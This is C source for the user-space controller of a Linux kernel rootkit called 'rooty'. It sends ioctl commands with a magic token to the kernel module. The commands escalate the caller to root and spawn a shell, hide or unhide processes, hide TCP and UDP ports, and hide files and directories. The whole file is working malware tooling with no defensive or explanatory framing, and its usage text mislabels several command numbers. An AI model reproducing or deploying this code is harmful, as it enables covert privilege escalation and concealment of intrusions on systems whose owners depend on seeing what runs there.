#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>

#define AUTH_TOKEN 0xDEADC0DE

#define SHELL "/bin/sh"


struct rooty_proc_args
{
    unsigned short pid;
};

struct rooty_port_args
{
    unsigned short port;
};

struct rooty_file_args
{
    char *name;
    unsigned short namelen;
};

struct rooty_args
{
    unsigned short cmd;
    void *ptr;
};

int main ( int argc, char *argv[] )
{
    struct rooty_args rooty_args;
    struct rooty_proc_args rooty_proc_args;
    struct rooty_port_args rooty_port_args;
    struct rooty_file_args rooty_file_args;
    int sockfd;
    int io;

    sockfd = socket(AF_INET, SOCK_STREAM, 6);
    if(sockfd < 0)
    {
        perror("socket");
        exit(1);
    }
    if(argc==1)
        argv[1]="-1";

    rooty_proc_args.pid = getpid();
    rooty_args.cmd = 1;
    rooty_args.ptr = &rooty_proc_args;

    io = ioctl(sockfd, AUTH_TOKEN, &rooty_args);

    switch ( atoi(argv[1]) )
    {
    case 0:
        printf("Dropping to root shell\n");
        rooty_args.cmd = 0;
        io = ioctl(sockfd, AUTH_TOKEN, &rooty_args);
        execl(SHELL, "sh", NULL);
        break;

    case 1:
    {
        unsigned short pid = (unsigned short)strtoul(argv[2], NULL, 0);

        printf("Hiding PID %hu\n", pid);

        rooty_proc_args.pid = pid;
        rooty_args.cmd = 1;
        rooty_args.ptr = &rooty_proc_args;

        io = ioctl(sockfd, AUTH_TOKEN, &rooty_args);
    }
    break;

    case 2:
    {
        unsigned short pid = (unsigned short)strtoul(argv[2], NULL, 0);

        printf("Unhiding PID %hu\n", pid);

        rooty_proc_args.pid = pid;
        rooty_args.cmd = 2;
        rooty_args.ptr = &rooty_proc_args;

        io = ioctl(sockfd, AUTH_TOKEN, &rooty_args);
    }
    break;

    case 3:
    {
        unsigned short port = (unsigned short)strtoul(argv[2], NULL, 0);

        printf("Hiding TCPv4 port %hu\n", port);

        rooty_port_args.port = port;
        rooty_args.cmd = 3;
        rooty_args.ptr = &rooty_port_args;

        io = ioctl(sockfd, AUTH_TOKEN, &rooty_args);
    }
    break;

    case 4:
    {
        unsigned short port = (unsigned short)strtoul(argv[2], NULL, 0);

        printf("Unhiding TCPv4 port %hu\n", port);

        rooty_port_args.port = port;
        rooty_args.cmd = 4;
        rooty_args.ptr = &rooty_port_args;

        io = ioctl(sockfd, AUTH_TOKEN, &rooty_args);
    }
    break;
    case 5:
    {
        unsigned short port = (unsigned short)strtoul(argv[2], NULL, 0);

        printf("Hiding TCPv6 port %hu\n", port);

        rooty_port_args.port = port;
        rooty_args.cmd = 5;
        rooty_args.ptr = &rooty_port_args;

        io = ioctl(sockfd, AUTH_TOKEN, &rooty_args);
    }
    break;

    case 6:
    {
        unsigned short port = (unsigned short)strtoul(argv[2], NULL, 0);

        printf("Unhiding TCPv6 port %hu\n", port);

        rooty_port_args.port = port;
        rooty_args.cmd = 6;
        rooty_args.ptr = &rooty_port_args;

        io = ioctl(sockfd, AUTH_TOKEN, &rooty_args);
    }
    break;

    case 7:
    {
        unsigned short port = (unsigned short)strtoul(argv[2], NULL, 0);

        printf("Hiding UDPv4 port %hu\n", port);

        rooty_port_args.port = port;
        rooty_args.cmd = 7;
        rooty_args.ptr = &rooty_port_args;

        io = ioctl(sockfd, AUTH_TOKEN, &rooty_args);
    }
    break;

    case 8:
    {
        unsigned short port = (unsigned short)strtoul(argv[2], NULL, 0);

        printf("Unhiding UDPv4 port %hu\n", port);

        rooty_port_args.port = port;
        rooty_args.cmd = 8;
        rooty_args.ptr = &rooty_port_args;

        io = ioctl(sockfd, AUTH_TOKEN, &rooty_args);
    }
    break;

    case 9:
    {
        unsigned short port = (unsigned short)strtoul(argv[2], NULL, 0);

        printf("Hiding UDPv6 port %hu\n", port);

        rooty_port_args.port = port;
        rooty_args.cmd = 9;
        rooty_args.ptr = &rooty_port_args;

        io = ioctl(sockfd, AUTH_TOKEN, &rooty_args);
    }
    break;

    case 10:
    {
        unsigned short port = (unsigned short)strtoul(argv[2], NULL, 0);

        printf("Unhiding UDPv6 port %hu\n", port);

        rooty_port_args.port = port;
        rooty_args.cmd = 10;
        rooty_args.ptr = &rooty_port_args;

        io = ioctl(sockfd, AUTH_TOKEN, &rooty_args);
    }
    break;

    case 11:
    {
        char *name = argv[2];

        printf("Hiding file/dir %s\n", name);

        rooty_file_args.name = name;
        rooty_file_args.namelen = strlen(name);
        rooty_args.cmd = 11;
        rooty_args.ptr = &rooty_file_args;

        io = ioctl(sockfd, AUTH_TOKEN, &rooty_args);
    }
    break;

    case 12:
    {
        char *name = argv[2];

        printf("Unhiding file/dir %s\n", name);

        rooty_file_args.name = name;
        rooty_file_args.namelen = strlen(name);
        rooty_args.cmd = 12;
        rooty_args.ptr = &rooty_file_args;

        io = ioctl(sockfd, AUTH_TOKEN, &rooty_args);
    }
    break;

    case 100:
    {
        printf("Null command\n");

        rooty_args.cmd = 100;

        io = ioctl(sockfd, AUTH_TOKEN, &rooty_args);
    }
    break;

    default:
    {
        printf("Usage: ioctl CMD [ARG]\n");
        printf("\tCMD \tDescription:\n");
        printf("\t---- \t------------\n");
        printf("\t0 \tGive root privilages\n");
        printf("\t1 \tHide process with pid [ARG]\n");
        printf("\t2 \tUnhide process with pid [ARG]\n");
        printf("\t3 \tHide TCP 4 port [ARG]\n");
        printf("\t4 \tUnhide TCP 4 port [ARG]\n");
        printf("\t5 \tHide UDPv4 port [ARG]\n");
        printf("\t6 \tUnhide UDPv4 port [ARG]\n");
        printf("\t7 \tHide TCPv6 port [ARG]\n");
        printf("\t8 \tUnhide TCPv6 port [ARG]\n");
        printf("\t9 \tHide UDPv4 port [ARG]\n");
        printf("\t10 \tUnhide UDPv6 port [ARG]\n");
        printf("\t11 \tHide file/directory named [ARG]\n");
        printf("\t12 \tUnhide file/directory named [ARG]\n");
        printf("\t100 \tEmpty cmd\n\n");
    }
    break;
    }

    if(io < 0)
    {
        perror("ioctl");
        exit(1);
    }

    return 0;
}
